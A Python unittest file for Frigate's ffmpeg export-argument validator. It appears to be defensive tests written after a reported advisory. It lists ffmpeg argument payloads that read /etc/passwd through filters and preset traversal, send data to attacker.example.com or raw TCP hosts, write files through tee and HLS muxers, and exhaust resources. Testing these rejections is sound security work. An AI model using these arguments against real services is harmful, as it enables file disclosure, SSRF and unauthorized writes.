import unittest

from frigate.record.export import validate_ffmpeg_args


class TestValidateFfmpegArgs(unittest.TestCase):
    """Tests for the non-admin custom export ffmpeg arg validator.

    The validator uses a structural allowlist: every token must be an
    allowlisted flag or the value of one, filter values are restricted to a
    safe set of filters, and no token may become a bare input/output URL.
    """

    def assertRejected(self, args: str) -> None:
        valid, message = validate_ffmpeg_args(args)
        self.assertFalse(valid, f"expected {args!r} to be rejected")
        self.assertNotEqual(message, "")

    def assertAllowed(self, args: str) -> None:
        valid, message = validate_ffmpeg_args(args)
        self.assertTrue(valid, f"expected {args!r} to be allowed, got: {message}")
        self.assertEqual(message, "")

    # --- legitimate use cases must keep working ---------------------------

    def test_timelapse_setpts_allowed(self):
        # The whole reason -vf cannot simply be blocked: timelapse exports.
        self.assertAllowed("-vf setpts=PTS/60 -r 25")
        self.assertAllowed("-vf setpts=0.04*PTS -r 30")  # server default
        self.assertAllowed("-filter:v setpts=PTS/60 -r 25")

    def test_default_input_args_allowed(self):
        self.assertAllowed("")
        self.assertAllowed("-an -skip_frame nokey")

    def test_encoding_args_allowed(self):
        self.assertAllowed("-c:v libx264 -crf 23 -preset fast")
        self.assertAllowed("-c:v copy -c:a copy")
        self.assertAllowed("-c:v libx264 -b:v 2M -maxrate 2M -bufsize 4M")
        self.assertAllowed("-movflags +faststart")
        self.assertAllowed("-pix_fmt yuv420p -r 30 -g 30")

    def test_safe_filters_allowed(self):
        self.assertAllowed("-vf scale=640:480")
        self.assertAllowed("-vf scale=640:480,setpts=0.5*PTS")
        self.assertAllowed("-vf format=yuv420p")
        self.assertAllowed("-vf transpose=1")
        self.assertAllowed("-vf hflip")
        self.assertAllowed("-vf fps=15")
        self.assertAllowed("-vf setsar=1 -an")
        self.assertAllowed("-vf setdar=16/9")

    # --- the reported advisory and file-read class ------------------------

    def test_reported_advisory_rejected(self):
        self.assertRejected(
            "-filter:v drawtext=textfile=/etc/passwd:fontcolor=white:fontsize=20"
        )

    def test_file_reading_filters_rejected(self):
        self.assertRejected("-vf movie=/etc/passwd")
        self.assertRejected("-vf drawtext=textfile=/etc/passwd")
        self.assertRejected("-vf subtitles=/etc/passwd")
        # marker embedded as an option of an otherwise-allowed filter name
        self.assertRejected("-vf scale=movie=/etc/passwd")

    def test_preset_file_read_rejected(self):
        # cwd-anchored traversal slipped past the old startswith() path check
        self.assertRejected("-fpre frigate/../../../etc/passwd")
        self.assertRejected("-fpre evil.preset")
        self.assertRejected("-vpre x")
        self.assertRejected("-apre x")
        self.assertRejected("-pre x")

    def test_slash_option_file_read_rejected(self):
        # ffmpeg "-/option file" reads the option value from a file
        self.assertRejected("-/filter:v graph.txt")
        self.assertRejected("-/filter_complex graph.txt")

    # --- network / SSRF class ---------------------------------------------

    def test_schemeless_protocol_rejected(self):
        self.assertRejected("-f mpegts tcp:10.0.0.5:4444")
        self.assertRejected("tcp:10.0.0.5:4444")
        self.assertRejected("udp:10.0.0.5:4444")
        self.assertRejected("-progress http:attacker.example.com:80/p")

    # --- file-write class --------------------------------------------------

    def test_tee_write_rejected(self):
        self.assertRejected("-c:v libx264 -map 0 -f tee [f=mpegts]/tmp/owned.ts")
        self.assertRejected("-f tee [f=mpegts]/etc/frigate/x.ts")
        self.assertRejected("tee:/tmp/x")

    def test_bare_output_token_rejected(self):
        self.assertRejected("evil.mp4")
        self.assertRejected("-c copy evil.mp4")
        self.assertRejected("x/../escaped.mkv")

    def test_file_producing_muxers_rejected(self):
        self.assertRejected("-f hls -hls_segment_filename pwn%03d.ts out.m3u8")
        self.assertRejected("-f md5 victim.txt")
        self.assertRejected("-f segment seg%03d.ts")

    def test_write_flags_rejected(self):
        self.assertRejected("-progress evil.log")
        self.assertRejected("-stats_enc_pre evil.csv")
        self.assertRejected("-report")

    # --- resource exhaustion / misc ---------------------------------------

    def test_dos_input_flags_rejected(self):
        self.assertRejected("-stream_loop -1")
        self.assertRejected("-readrate 0.001")

    def test_disallowed_flags_rejected(self):
        self.assertRejected("-map 0")
        self.assertRejected("-i /etc/passwd")
        self.assertRejected("-attach evil.bin")
        self.assertRejected("-dump_attachment evil.bin")
        self.assertRejected("/etc/passwd")
        self.assertRejected("-metadata comment=x")


if __name__ == "__main__":
    unittest.main()
